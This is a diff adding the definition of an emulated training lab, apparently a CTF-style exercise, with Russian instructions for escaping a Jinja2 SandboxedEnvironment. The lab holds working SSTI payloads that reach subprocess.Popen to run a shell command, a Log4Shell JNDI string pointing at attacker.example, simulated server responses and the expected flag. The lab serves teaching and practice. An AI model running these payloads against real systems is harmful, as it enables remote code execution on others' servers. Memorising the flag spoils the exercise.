@@ -1,0 +1,27 @@
+{
+  "id": "web-ssti-advanced",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{s4ndb0x_3sc4p3_v14_4ttr}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: SSTI — побег из песочницы Jinja2\n\nТот же `?name=`, но теперь включён `SandboxedEnvironment`: `{{7*7}}` работает,\nа `{{config}}` и `.__class__` блокируются (`SecurityError`). Обойди песочницу\nчерез фильтр `|attr` и дойди до RCE.\n\nСложные payload'ы лежат в файлах и шлются через `--data-urlencode name@`.\n\n1. Математика ещё работает:\n\n   curl -s --data-urlencode 'name={{7*7}}' https://shop.local/greet\n\n2. А доступ к объектам — нет:\n\n   curl -s --data-urlencode 'name={{config}}' https://shop.local/greet\n   curl -s --data-urlencode \"name={{''.__class__}}\" https://shop.local/greet\n\n3. Побег через |attr (в файле escape.txt):\n\n   curl -s --data-urlencode 'name@escape.txt' https://shop.local/greet\n\n4. Выполняем команду и читаем флаг (в файле rce.txt):\n\n   curl -s --data-urlencode 'name@rce.txt' https://shop.local/greet > found.txt\n\n5. Родственный вектор — JNDI/Log4Shell (файл jndi.txt):\n\n   curl -s -H 'User-Agent: {{jndi}}' https://shop.local/ --data-binary @jndi.txt\n\n6. Набери `check`.\n" },
+    { "path": "/home/student/task/escape.txt", "text": "{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()}}\n" },
+    { "path": "/home/student/task/rce.txt", "text": "{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(444)('cat /flag.txt',shell=True,stdout=-1)|attr('communicate')()}}\n" },
+    { "path": "/home/student/task/jndi.txt", "text": "user=${jndi:ldap://attacker.example:1389/a}\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        { "match": "rce\\.txt|communicate", "example": "--data-urlencode 'name@rce.txt' https://shop.local/greet", "output": "Hello, b'nto{s4ndb0x_3sc4p3_v14_4ttr}\\n'\n" },
+        { "match": "escape\\.txt|attr", "example": "--data-urlencode 'name@escape.txt' https://shop.local/greet", "output": "Hello, [<class 'type'>, <class 'weakref'>, ..., <class 'subprocess.Popen'>]\n" },
+        { "match": "jndi\\.txt|jndi:|\\$\\{jndi|%24%7Bjndi", "example": "-H 'User-Agent: ${jndi:ldap://...}' https://shop.local/ --data-binary @jndi.txt", "output": "HTTP/1.1 200 OK\n\n[log4j] resolving JNDI: ldap://attacker.example:1389/a\n" },
+        { "match": "__class__", "example": "--data-urlencode \"name={{''.__class__}}\" https://shop.local/greet", "output": "{\"error\":\"SecurityError: access to attribute __class__ is unsafe\"}\n" },
+        { "match": "config", "example": "--data-urlencode 'name={{config}}' https://shop.local/greet", "output": "Hello, \n" },
+        { "match": "7\\*7|7%2A7", "example": "--data-urlencode 'name={{7*7}}' https://shop.local/greet", "output": "Hello, 49\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /greet на shop.local.\n"
+    }
+  }
+}
